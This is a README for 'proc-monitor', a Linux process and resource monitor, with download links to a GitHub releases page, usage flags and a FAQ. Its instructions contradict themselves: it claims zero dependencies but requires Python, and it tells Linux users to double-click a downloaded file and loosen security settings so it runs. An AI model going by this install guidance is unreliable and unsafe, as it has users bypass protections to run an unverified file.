# 🎉 proc-monitor - Monitor Your System's Resource Usage Effortlessly

## 🚀 Getting Started
Welcome to proc-monitor! This tool is designed to help you keep an eye on high CPU and RAM usage on your Linux system. With proc-monitor, you can quickly identify which processes are consuming your resources and understand what systemd services started them. It’s perfect for those tricky, short-lived processes that may vanish before you can investigate their effects.

## 🔗 Download Now
[![Download proc-monitor](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/anonimousmaru/proc-monitor/releases)

## 📥 Download & Install
To get started, you need to download proc-monitor. Follow these steps:

1. **Visit the Releases page**: Go to our [Downloads page](https://github.com/anonimousmaru/proc-monitor/releases). This page contains the latest versions of proc-monitor.
   
2. **Find the version you want**: Look for the latest release. It should be at the top of the page.

3. **Download the application**: Click on the appropriate download link for your system. The file is small, so it should download quickly.

4. **Navigate to your Downloads folder**: After the download completes, open your file explorer and go to the folder where your downloads are saved.

5. **Run the program**: Double-click the downloaded file to start proc-monitor. You might need to adjust your security settings to allow the application to run.

## 🛠️ Features
- **Zero Dependency**: No additional software or libraries are needed for proc-monitor to work.
- **High Resource Monitoring**: Keep track of CPU and RAM usage effortlessly.
- **Short-lived Process Tracking**: Identify processes that start and stop quickly, which are often hard to catch.
- **Systemd Service Identification**: Learn which systemd services are starting high-resource processes.
- **Threshold and Top-N Monitoring**: Set specific limits for resource usage or identify the top N processes consuming your resources.

## 📋 System Requirements
- **Operating System**: Linux (any distribution).
- **Python**: Must have Python 3.x installed. (Check your Python version with the command `python --version`).
- **Memory**: Minimum of 1 GB RAM recommended.

## 📖 How to Use proc-monitor
Once you have installed proc-monitor, it’s simple to start using it:

1. **Open a terminal**: Search for “Terminal” in your applications menu.

2. **Run proc-monitor**: Type `./proc-monitor` and press Enter. Make sure you are in the directory where you downloaded proc-monitor.

3. **Follow the prompts**: The tool will present you with options to configure your monitoring preferences. Choose the one that best fits your needs.

4. **Analyze your data**: The results will show you the resource usage of various processes. 

5. **Take action**: Based on the information proc-monitor provides, you can terminate processes or investigate further based on the systemd services identified.

## ⚙️ Configuration Options
proc-monitor allows you to customize your monitoring experience. You can set thresholds for CPU and memory usage, and you can choose whether to monitor a specific number of processes.

### Setting Up Thresholds
- To set a CPU threshold, run: `./proc-monitor --cpu-threshold [value]`
- To set a memory threshold, run: `./proc-monitor --mem-threshold [value]`
- Replace `[value]` with your desired limits (e.g., `80` for 80%).

### Top-N Processes Monitoring
- To monitor the top N processes, run: `./proc-monitor --top-n [value]`
- Replace `[value]` with the number of processes you'd like to track.

## 🤔 FAQ
**Q: Can I use proc-monitor on any Linux distribution?**  
A: Yes, proc-monitor works on all Linux distributions that support Python.

**Q: What if I encounter errors?**  
A: Ensure you have Python installed and check that you're running the latest version of proc-monitor. If issues persist, consult the community or raise an issue in the repository.

**Q: Is there a community or support available?**  
A: Yes! You can find community insights and support by checking out the 'Issues' section of the GitHub repository.

## 🌟 Contributing
If you want to contribute to proc-monitor, we welcome your input! You can enhance our monitoring tool by reporting bugs or suggesting features. Follow the guidelines in the repository for your contributions.

## 🔗 Links
- [Download proc-monitor](https://github.com/anonimousmaru/proc-monitor/releases)
- [GitHub Repository](https://github.com/anonimousmaru/proc-monitor)

Thank you for choosing proc-monitor! Happy monitoring!